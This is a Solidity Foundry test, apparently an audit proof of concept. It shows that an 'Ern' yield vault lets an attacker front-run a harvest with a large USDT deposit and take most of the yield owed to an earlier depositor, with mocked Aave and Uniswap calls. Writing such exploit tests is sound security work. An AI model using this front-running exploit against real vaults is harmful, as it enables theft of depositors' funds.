// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/Ern.sol";

contract ErnTest is Test {
    address constant USDT           = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WBTC           = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant AAVE_PROVIDER  = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;
    address constant UNISWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant AAVE_POOL      = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant aUSDT          = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;

    uint256 constant USDT_DECIMALS = 6;
    uint256 constant WBTC_DECIMALS = 8;

    uint256 constant ALICE_DEPOSIT    = 100_000 * 10**USDT_DECIMALS; 
    uint256 constant ATTACKER_DEPOSIT = 900_000 * 10**USDT_DECIMALS; 
    uint256 constant YIELD_AMOUNT     =  10_000 * 10**USDT_DECIMALS; 

    uint256 constant MOCK_SWAP_OUT    = 1_000 * 10**WBTC_DECIMALS; 

    Ern public ern;
    address alice    = address(0x111);
    address attacker = address(0x222);

    function setUp() public {

        ern = new Ern(
            ERC20(USDT),
            ERC20(WBTC),
            IAaveAddressesProvider(AAVE_PROVIDER),
            IDex(UNISWAP_ROUTER)
        );

        // give users USDT
        deal(USDT, alice, ALICE_DEPOSIT);
        deal(USDT, attacker, ATTACKER_DEPOSIT);

        // mock Aave supply
        vm.mockCall(
            AAVE_POOL,
            abi.encodeWithSelector(
                bytes4(keccak256("supply(address,uint256,address,uint16)"))
            ),
            abi.encode()
        );

        // mock Aave withdraw
        vm.mockCall(
            AAVE_POOL,
            abi.encodeWithSelector(
                bytes4(keccak256("withdraw(address,uint256,address)"))
            ),
            abi.encode(YIELD_AMOUNT)
        );

        // mock Uniswap swap
        vm.mockCall(
            UNISWAP_ROUTER,
            abi.encodeWithSelector(IDex.exactInputSingle.selector),
            abi.encode(MOCK_SWAP_OUT)
        );

        // mock WBTC transfer
        vm.mockCall(
            WBTC,
            abi.encodeWithSelector(
                bytes4(keccak256("transfer(address,uint256)"))
            ),
            abi.encode(true)
        );
    }

    // mock aUSDT balance seen by vault
    function _mockAUsdtBalance(uint256 balance) internal {
        vm.mockCall(
            aUSDT,
            abi.encodeWithSelector(
                bytes4(keccak256("balanceOf(address)")),
                address(ern)
            ),
            abi.encode(balance)
        );
    }

    // approve and deposit USDT
    function _approveAndDeposit(address user, uint256 amount) internal {

        vm.startPrank(user);

        // USDT is non standard -> approve via low level call
        (bool ok,) = USDT.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(ern),
                amount
            )
        );

        require(ok, "USDT approve failed");
        ern.deposit(amount);
        vm.stopPrank();
    }

    function testYieldTheft() public {

        // 1. Alice deposits
        _mockAUsdtBalance(ALICE_DEPOSIT);
        _approveAndDeposit(alice, ALICE_DEPOSIT);
        assertEq(ern.balanceOf(alice), ALICE_DEPOSIT);
        assertEq(ern.totalSupply(), ALICE_DEPOSIT);

        // 2. Yield accrues in Aave
        uint256 afterYieldBalance = ALICE_DEPOSIT + YIELD_AMOUNT;
        _mockAUsdtBalance(afterYieldBalance);
        (bool canHarvest, uint256 pendingYield) = ern.canHarvest();

        assertTrue(canHarvest);
        assertEq(pendingYield, YIELD_AMOUNT);

        // 3. Attacker front run harvest
        _mockAUsdtBalance(afterYieldBalance + ATTACKER_DEPOSIT);
        _approveAndDeposit(attacker, ATTACKER_DEPOSIT);

        assertEq(ern.balanceOf(attacker), ATTACKER_DEPOSIT);
        assertEq(
            ern.totalSupply(),
            ALICE_DEPOSIT + ATTACKER_DEPOSIT
        );

        // 4. Harvest executed
        vm.warp(block.timestamp + 25 hours);
        vm.prank(ern.owner());
        ern.harvest(0);

        // 5. Check reward distribution
        uint256 aliceReward    = ern.claimableYield(alice);
        uint256 attackerReward = ern.claimableYield(attacker);

        // expected values from exploit scenario
        assertApproxEqAbs(aliceReward,    9.5e9,  1e6);
        assertApproxEqAbs(attackerReward, 8.55e10, 1e6);

        // logs for easier visualization
        emit log_named_decimal_uint(
            "Expected fair reward for Alice (no attack)",
            9.5e10,
            8
        );

        emit log_named_decimal_uint(
            "Actual Alice reward",
            aliceReward,
            8
        );

        emit log_named_decimal_uint(
            "Attacker stolen reward",
            attackerReward,
            8
        );
    }
}